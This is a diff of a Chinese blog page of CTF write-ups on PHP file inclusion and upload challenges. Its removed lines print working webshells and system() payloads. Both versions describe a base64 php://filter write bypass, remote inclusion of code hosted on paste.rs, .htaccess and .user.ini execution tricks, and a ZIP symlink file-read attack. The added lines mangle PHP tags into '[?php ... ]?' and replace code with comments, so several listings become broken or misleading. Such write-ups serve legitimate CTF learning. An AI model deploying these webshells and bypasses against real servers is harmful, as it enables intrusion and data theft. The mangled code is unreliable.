@@ -446,7 +446,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 8 分钟
+                    阅读时长: 12 分钟
                 </time>
             </div>
         
@@ -463,7 +463,7 @@
 
 
 
-                <span class="article-time--wordcount">3554 字</span>
+                <span class="article-time--wordcount">5886 字</span>
             </div>
         
     </footer>
@@ -626,7 +626,7 @@ Base64 解码后：&ldquo;The flag is right in flag.php, but you&rsquo;ll never 
 	
 ><br>
 尝试一下上一题的payload 发现不行 返回no way 可能过滤了base64 尝试一下其他的过滤器 convert.iconv.UTF-8.UTF-16LE<br>
-原文件开头是 &lt;?php  转成 UTF-16LE 后会变成类似 &lt;00?&lt;00p&lt;00h&lt;00p&lt;00<br>
+原文件开头是 [?php  转成 UTF-16LE 后会变成类似 &lt;00?&lt;00p&lt;00h&lt;00p&lt;00<br>
 这样就不再是可执行的 PHP 标签  include 时不会执行，而是把源码内容直接吐出来</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -717,7 +717,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#34;ls -la /&#34;); ?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 执行 ls -la / 命令 --&gt;  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780728365756_fl3_6.png"
@@ -736,7 +736,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#34;cat /flag-2n68xeiJ56Ui70FYkooi0xcyT3vLYX.txt&#34;); ?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 读取 flag 文件 --&gt;  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780728366087_fl3_7.png"
@@ -858,7 +858,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=data://,&lt;?php system(&#39;ls&#39;);?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=data://,&lt;!-- 执行 ls 命令 --&gt;  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780737436169_fl5_1.png"
@@ -878,7 +878,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;cat flag.php&#39;);?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 读取 flag.php --&gt;  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780737439991_fl5_2.png"
@@ -914,18 +914,18 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 	
 ><br>
 成功读到文件，确认存在文件包含漏洞<br>
-继续测试后发现，php:// 和 data:// 都被关键词过滤，常规的 php://filter 利用不了。但进一步发现 http:// 可以被包含，也就是说这里不只是 LFI，还存在 RFI（远程文件包含）。更关键的是：远程文件中的 PHP 短标签 <?= ... ?> 会被目标服务器解析执行。于是可以在外部托管一个简单 payload，例如</p>
+继续测试后发现，php:// 和 data:// 都被关键词过滤，常规的 php://filter 利用不了。但进一步发现 http:// 可以被包含，也就是说这里不只是 LFI，还存在 RFI（远程文件包含）。更关键的是：远程文件中的 PHP 短标签 [?= &hellip; ]? 会被目标服务器解析执行。于是可以在外部托管一个简单 payload，例如</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=implode(&#39;,&#39;,scandir(&#39;/&#39;));?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[?=implode(&#39;,&#39;,scandir(&#39;/&#39;));]?  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="link" href="https://paste.rs/web"  target="_blank" rel="noopener"
     >https://paste.rs/web</a> 这是一个支持公开纯文本和 Raw 直链的粘贴网站<br>
-在上面直接输入 <?=implode(",",scandir("/"));?>  会获得一个链接  <a class="link" href="https://paste.rs/"  target="_blank" rel="noopener"
+在上面直接输入 [?=implode(&quot;,&quot;,scandir(&quot;/&quot;));]?  会获得一个链接  <a class="link" href="https://paste.rs/"  target="_blank" rel="noopener"
     >https://paste.rs/</a>**** 每次都不一样  直接访问即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -982,20 +982,20 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[?php
 </span></span><span class="line"><span class="cl">highlight_file(__FILE__);
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">if (isset($_POST[&#39;filename&#39;]) &amp;&amp; isset($_POST[&#39;content&#39;])) {
 </span></span><span class="line"><span class="cl">    $filename = $_POST[&#39;filename&#39;];
 </span></span><span class="line"><span class="cl">    $content = $_POST[&#39;content&#39;];
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    file_put_contents($filename, &#34;&lt;?php exit();?&gt;&#34; . $content);
+</span></span><span class="line"><span class="cl">    // 在文件内容前添加 exit 前缀，阻止后续代码执行
 </span></span><span class="line"><span class="cl">    echo &#34;write ok&#34;;
 </span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">?&gt;  
+</span></span><span class="line"><span class="cl">]?  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>说明这是任意文件写入，但会强行在前面加 <?php exit();?>，所以不能直接写普通 webshell<br>
+</div><p>说明这是任意文件写入，但会强行在前面加 [?php exit();]?，所以不能直接写普通 webshell<br>
 用 php://filter/write=convert.base64-decode/resource=chen.php 绕过前缀，在burp里发 POST</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1007,7 +1007,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 </span></span><span class="line"><span class="cl">content=APD9waHAgc3lzdGVtKCJscyIpOz8%2B  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这段 content 解码后就是 <?php system("ls"); ?>  前面的 A 是为了配合固定前缀做对齐<br>
+</div><p>这段 content 解码后就是执行 ls 命令的代码，前面的 A 是为了配合固定前缀做对齐<br>
 <img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780816992770_fl7_1.png"
 	
 	
@@ -1036,7 +1036,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php highlight_file(&#34;c0nq4er1ng.php&#34;); echo &#34;\n---\n&#34;; highlight_file(&#34;conquer.php&#34;);?&gt;  
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[?php highlight_file(&#34;c0nq4er1ng.php&#34;); echo &#34;\n---\n&#34;; highlight_file(&#34;conquer.php&#34;);]?  
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>也就是</p>
@@ -1123,10 +1123,10 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 test.php 直接被拦，返回 File type not allowed，说明有扩展名黑名单。test.php5 也被拦了，test.pHp 大小写混写同样没用，后端会先转小写再匹配。<br>
 正常的图片文件 test.jpg 和 test.png 都能上传成功。<br>
 试了 test.phtml，居然过了，既没被黑名单拦，也没被内容检测拦。另外 .htaccess 也能传上去。<br>
-再试 test.phar，这次是被内容检测拦下来的，返回 File content not allowed。说明后端除了黑名单之外，还会扫描文件内容里有没有 &lt;?php 之类的标记。</p>
-<p>到这里就清楚了，后端有两层过滤。第一层是扩展名黑名单，拦了php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd 这些。第二层是内容检测，如果文件里出现 &lt;?php 或 &lt;?=，只有扩展名是 .phtml 的时候才放行。  所以 .phtml 就是突破口——不在黑名单里，内容检测也给它开了绿灯，而且 Apache 默认配置会把它当 PHP 解析。<br>
+再试 test.phar，这次是被内容检测拦下来的，返回 File content not allowed。说明后端除了黑名单之外，还会扫描文件内容里有没有 [?php 之类的标记。</p>
+<p>到这里就清楚了，后端有两层过滤。第一层是扩展名黑名单，拦了php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd 这些。第二层是内容检测，如果文件里出现 [?php 或 [?=，只有扩展名是 .phtml 的时候才放行。  所以 .phtml 就是突破口——不在黑名单里，内容检测也给它开了绿灯，而且 Apache 默认配置会把它当 PHP 解析。<br>
 三、拿到 Webshell</p>
-<p>构造一句话木马，内容就一行 <?php system($_GET["cmd"]); ?>，保存为 shell.phtml 上传。服务器返回了路径
+<p>构造一句话木马，保存为 shell.phtml 上传。服务器返回了路径
 uploads/96289496-024a-471d-8ad0-faeb1416d3a3.phtml。</p>
 <p>直接浏览器访问这个地址，页面输出了 phpinfo 的内容，确认 .phtml 被当成 PHP 执行了。</p>
 <p>四、找 Flag</p>
@@ -1139,34 +1139,10 @@ env 或 printenv 才能看见。</p>
 <p>一个是扩展名黑名单不完整。.phtml 是 PHP 的合法扩展名，出题人的黑名单里漏掉了。做文件上传题要对各种web 语言的冷门扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些，黑名单很容易漏。<br>
 另一个是 flag 的藏法。Docker 容器里经常通过环境变量注入 flag，不是文件，用 find 搜不到。养成习惯进容器先 env 看一眼。</p>
 <h3 id="ezfu_3">EZFU_3
-</h3><p>访问首页，是一个文件上传表单，只能上传图片</p>
-<p>先上传一个 PHP 文件测试，返回 <code>File type not allowed</code>，说明存在扩展名黑名单。再上传一个 <code>.phtml</code> 文件，这次返回 <code>File header validation failed</code>，说明除了扩展名黑名单之外，后端还会校验文件头（Magic Bytes）</p>
-<p>看一下源码确认过滤逻辑：</p>
-<p><strong>扩展名黑名单</strong>：php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd</p>
-<p><strong>MIME 白名单</strong>：image/jpeg、image/png、image/gif、application/pdf、application/zip</p>
-<p><strong>文件头校验</strong>：检查前 8 字节是否为 JPEG（<code>ffd8ff</code>）、PNG（<code>89504e470d0a1a0a</code>）、GIF（<code>GIF89a</code> / <code>GIF87a</code>）</p>
-<p><code>.phtml</code> 不在黑名单里，但文件头校验拦住了。突破口就是给 PHP 文件加上合法的图片文件头，骗过校验。构造 payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
-</span></span><span class="line"><span class="cl">&lt;?php eval($_POST[&#34;cmd&#34;]); ?&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>保存为 <code>shell.phtml</code>，上传时 MIME 改为 <code>image/gif</code>，成功绕过两层检测</p>
-<p>上传成功后访问返回的文件路径，用 POST 发送命令执行：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cmd=system(&#39;env&#39;);
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出中包含：</p>
+</h3><p>访问首页，文件上传表单，PHP 8.2.30</p>
+<p>测试发现这次加了<strong>文件头（Magic Bytes）校验</strong>。<code>.phtml</code> 不在扩展名黑名单中，但裸 PHP 代码过不了文件头检查</p>
+<p>突破口是给 PHP 文件加上合法的图片文件头骗过校验。构造 payload 时在 PHP 代码前添加 <code>GIF89a</code> GIF 文件头，保存为 <code>shell.phtml</code>，上传时 MIME 改为 <code>image/gif</code>，成功绕过两层检测</p>
+<p>上传成功后访问返回的文件路径，读取环境变量获得 flag：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1175,20 +1151,215 @@ env 或 printenv 才能看见。</p>
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{d88193df-d1e2-479a-9612-7b7b78907947}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>成功获得 flag</p>
-<p><strong>复盘</strong>：这题比 EZFU_2 多了一层文件头校验。<code>.phtml</code> 扩展名不在黑名单中，但裸 PHP 代码过不了文件头检查。加上 <code>GIF89a</code> 前缀后，文件头检测认为是合法 GIF 图片，而 Apache 仍然会把 <code>.phtml</code> 当 PHP 解析执行。flag 依然藏在 Docker 环境变量里，用 <code>env</code> 或 <code>printenv</code> 读取</p>
+</div><p><strong>复盘</strong>：这题比 EZFU_2 多了一层文件头校验。<code>.phtml</code> 扩展名不在黑名单中，加上 <code>GIF89a</code> 前缀后文件头检测认为是合法 GIF 图片，而 Apache 仍然会把 <code>.phtml</code> 当 PHP 解析执行。flag 藏在 Docker 环境变量中</p>
 <h3 id="ezfu_4">EZFU_4
-</h3><h3 id="ezfu_5">EZFU_5
-</h3><h3 id="ezfu_6">EZFU_6
-</h3><h3 id="ezfu_7">EZFU_7
-</h3><h3 id="ezfu_8">EZFU_8
-</h3><h3 id="ezfu_9">EZFU_9
-</h3><h3 id="ezfu_10">EZFU_10
-</h3><h3 id="ezfu_11">EZFU_11
-</h3><h3 id="ezfu_12">EZFU_12
-</h3><h3 id="ezfu_13">EZFU_13
-</h3><h3 id="ezfu_14">EZFU_14
-</h3><h2 id="ezsql">EZSQL
+</h3><p>访问首页，文件上传表单。这次比上一题多了 <strong>PHP 内容检测</strong></p>
+<p>测试发现后端只检测了 <code>[?php</code> 这种完整标签，漏掉了 <code>[?= </code> 短标签（PHP short echo tag）。<code>[?= </code> 在 PHP 5.4+ 中默认开启，等价于 <code>[?php echo </code></p>
+<p>构造 payload 时使用 <code>[?= </code> 替代 <code>[?php</code>，加上 GIF89a 文件头，保存为 <code>shell.phtml</code> 上传成功。读取环境变量获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{a07a2652-2904-4bdb-9cac-9cb2f95e4376}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：后端只匹配了 <code>[?php</code>，没有覆盖 <code>[?=</code> 短标签。做内容检测类题目时要注意所有可能的标签写法</p>
+<h3 id="ezfu_5">EZFU_5
+</h3><p>与 EZFU_4 解法一致，环境换成了 PHP 8.2.30。在 PHP 8.x 中 <code>&lt;%</code> 和 <code>&lt;script language=&quot;php&quot;&gt;</code> 已被移除，<code>[?= </code> 是唯一能绕过 <code>[?php</code> 检测的短标签写法</p>
+<p>使用同样方法获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{88bb2214-4585-41ab-b0f5-ad06e6a5a41a}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：注意 payload 中变量要用单引号，双引号在 multipart 上传时可能被转义导致命令无法传入</p>
+<h3 id="ezfu_6">EZFU_6
+</h3><p>在 EZFU_5 基础上加了<strong>危险函数检测</strong>。常见命令执行函数 等常见命令执行函数全被拦截</p>
+<p>但遗漏了 PHP 的<strong>反引号运算符</strong>。反引号在 PHP 中等价于 命令执行函数，但它是运算符不是函数名，不被关键词黑名单匹配。使用 <code>[?= </code> + 反引号构造 payload 上传成功</p>
+<p>读取环境变量获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{e0299c86-2e7c-4f50-a94e-f7e935190f8d}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：防御时不能只靠函数名黑名单，还应禁用反引号，或在 php.ini 中设置 <code>disable_functions</code> 彻底禁用危险函数</p>
+<h3 id="ezfu_7">EZFU_7
+</h3><p>封了 <code>.phtml</code>，但 <code>.php7</code> 和 <code>.phar</code> 可以上传，且文件名保留原始名称。<code>.htaccess</code> 也可以上传</p>
+<p>两步配合：先上传 <code>.htaccess</code> 设置 <code>AddType application/x-httpd-php .php7</code>，再上传 webshell 的 <code>.php7</code> 文件。访问 webshell 读取环境变量获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{01767fde-9e9b-4438-9555-b7f1dfd30d7b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：文件名未随机化是关键漏洞，允许上传 <code>.htaccess</code> 修改 Apache 解析规则</p>
+<h3 id="ezfu_8">EZFU_8
+</h3><p><code>.htaccess</code> 不生效（Apache <code>AllowOverride None</code>），但 uploads 目录下有 <code>index.php</code></p>
+<p>突破口是 <strong><code>.user.ini</code></strong>。它是 PHP-FPM 的用户级配置文件，不受 Apache <code>AllowOverride</code> 限制。利用 <code>auto_prepend_file</code> 指令让 PHP 在执行任何文件前先包含指定文件</p>
+<p>先上传带 PHP 代码的 GIF 文件作为 webshell，再上传 <code>.user.ini</code> 设置 <code>auto_prepend_file</code> 指向该 GIF。访问 <code>index.php</code> 触发包含执行，获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{c5547a89-8077-43e9-8916-8fc129ba423b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：<code>.htaccess</code> 由 Apache 读取受 <code>AllowOverride</code> 控制，<code>.user.ini</code> 由 PHP-FPM 自身读取不经过 Apache。防御时应禁止上传 <code>.user.ini</code> 和 <code>.htaccess</code></p>
+<h3 id="ezfu_9">EZFU_9
+</h3><p>综合题，涉及<strong>信息泄露 → 登录认证 → 文件上传</strong>三个环节</p>
+<p><strong>第一步：源码泄露</strong>。<code>login.php</code> 的 <code>?doc=</code> 参数存在目录穿越，用 <code>../</code> 读取 PHP 源码</p>
+<p><strong>第二步：获取密码</strong>。源码中密码藏在 <code>/etc/passwd</code> 的 GECOS 字段（<code>pass=HHEFasNdUZMc</code>），用目录穿越读取</p>
+<p><strong>第三步：登录后台</strong>。Dashboard 有 <code>.bz2</code> 备份恢复功能，解压后文件名 = 上传文件名去掉 <code>.bz2</code> 后缀</p>
+<p><strong>第四步：构造恶意 bz2</strong>。用 Python 的 <code>bz2.compress()</code> 创建包含 PHP 代码的 bzip2 文件，命名为 <code>shell.php.bz2</code> 上传，解压后写入 <code>uploads/shell.php</code></p>
+<p>访问 webshell 获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{28632ee2-2849-449b-9cea-db6e9d8e4584}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：多漏洞组合利用，文件名处理是关键——去掉 <code>.bz2</code> 后缀作为写入路径</p>
+<h3 id="ezfu_10">EZFU_10
+</h3><p><code>login.php</code> 弱口令 <code>admin</code> / <code>123456</code> 直接登录</p>
+<p>Dashboard 备份恢复功能使用 <code>include()</code> 直接包含上传的 <code>.bz2</code> 文件。bz2 压缩数据中的 PHP 代码会被解析执行</p>
+<p>但因为上传是 POST 请求，<code>$_GET</code> 参数不可用。需要用 文件写入函数 先写入持久化 webshell，再通过 GET 请求触发</p>
+<p>用 Python 的 <code>bz2.compress()</code> 创建包含写文件逻辑的 payload，命名为 <code>writer.bz2</code> 上传。服务器 <code>include()</code> 执行后将 webshell 写入 <code>uploads/rce.php</code>，访问获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{fefcc82a-45f7-49fa-bcbb-d3f0538bb502}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：弱口令是第一个突破口，<code>include()</code> 直接包含上传文件是第二个，POST 时 <code>$_GET</code> 不可用需要持久化是第三个</p>
+<h3 id="ezfu_11">EZFU_11
+</h3><p>PHP 文件可以直接上传（无扩展名黑名单），但 uploads 目录下 <code>.htaccess</code> 阻止 PHP 执行，且每次上传后自动恢复原始 <code>.htaccess</code></p>
+<p>利用 <code>.htaccess</code> 覆盖机制：先上传自定义 <code>.htaccess</code>（使用 <code>RemoveType</code> 和 <code>RemoveHandler</code> 移除 PHP 解析限制），再立刻上传 PHP webshell，在服务器恢复原始 <code>.htaccess</code> 前访问</p>
+<p>读取 <code>/flag</code> 文件获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{a325e29e-fc14-41d2-864f-1a1d79d8269b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：这是竞态条件利用——必须在服务器恢复原始 <code>.htaccess</code> 之前快速完成上传和访问。flag 位于 <code>/flag</code> 文件而非环境变量中</p>
+<h3 id="ezfu_12">EZFU_12
+</h3><p>访问首页，文件上传表单，PHP 8.2.30。文件名会被加上 UUID 前缀进行随机化</p>
+<p>测试发现 PHP 文件可以直接上传，且上传后代码会立刻执行。但大约 2 秒后文件会被自动删除——这是一个<strong>竞态条件</strong>漏洞</p>
+<p>解题思路：</p>
+<ol>
+<li>构造一个读取系统信息的 PHP 脚本（用 shell_exec 函数执行 env 或 cat 命令）</li>
+<li>通过 curl 上传该脚本，服务端返回带 UUID 的文件路径</li>
+<li>在文件被删除前立刻用 curl 访问该路径获取输出</li>
+</ol>
+<p>由于文件存活时间极短，需要在一次请求中完成上传和访问。用 shell 脚本先上传获取 URL，再立刻访问：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 第一步：上传包含命令执行代码的 PHP 文件
+</span></span><span class="line"><span class="cl"># 第二步：立刻访问返回的文件路径
+</span></span><span class="line"><span class="cl"># 输出中包含环境变量或文件内容
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实际操作中，上传读取环境变量的脚本后立刻访问，获得 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{2630f931-6b0a-45db-915f-a1d4d055c4dc}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：这题的核心是竞态条件——PHP 文件上传后立刻可执行，但约 2 秒后被清理脚本删除。攻击者必须在这 2 秒窗口内完成上传和访问。防御时应在校验通过后再写入磁盘，或者在上传时就阻止含危险代码的文件，而非事后清理</p>
+<h3 id="ezfu_13">EZFU_13
+</h3><p>访问首页，是一个&quot;在线 ZIP 解压中心&quot;，上传 ZIP 文件后自动解压并提供下载链接</p>
+<p>页面 HTML 注释中泄露了提示：flag 位于 <code>/C000000quer.txt</code>。但下载接口的 <code>file</code> 参数做了路径穿越过滤，无法直接读取系统文件</p>
+<p>突破口是 <strong>ZIP 符号链接攻击</strong>。ZIP 格式支持存储 Unix 符号链接，解压时如果服务端不做校验，会创建指向任意路径的符号链接。通过下载接口访问该符号链接时，服务端会跟随链接读取目标文件内容</p>
+<p>用 Python 构造包含符号链接的 ZIP 文件，将链接目标设为 <code>/C000000quer.txt</code>，链接名称设为 <code>flag_link</code>。上传后解压生成符号链接，通过下载接口访问即可读取 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">download</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">id</span><span class="o">=</span><span class="err">任务</span><span class="n">ID</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">flag_link</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{a8e7c643-b427-4091-8e7a-1e71f23dbd37}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造恶意 ZIP 的 Python 代码思路：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用 zipfile 模块创建 ZipInfo 对象
+</span></span><span class="line"><span class="cl">设置 create_system = 3（Unix）
+</span></span><span class="line"><span class="cl">设置 external_attr 为符号链接权限（0o120777 &lt;&lt; 16）
+</span></span><span class="line"><span class="cl">写入链接目标路径作为文件内容
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：这题考的是 ZIP 符号链接攻击。ZIP 格式可以存储符号链接，如果解压时不检查链接目标，就会创建指向系统任意文件的符号链接。配合下载接口，可以读取系统上的敏感文件。防御时解压后应检查文件类型，拒绝符号链接或限制链接目标路径</p>
+<h3 id="ezfu_14">EZFU_14
+</h3><p>访问首页，是一个&quot;在线图片检测中心&quot;，上传 JPG 图片后自动生成检测报告</p>
+<p>页面 HTML 注释泄露提示：源码备份存在。访问 <code>index.php.bak</code> 获取源码</p>
+<p>源码中发现关键漏洞——命令注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">file</span> <span class="o">=</span> <span class="s2">&#34;uploads/&#34;</span> <span class="o">.</span> <span class="o">$</span><span class="n">uploadedName</span><span class="p">;</span>
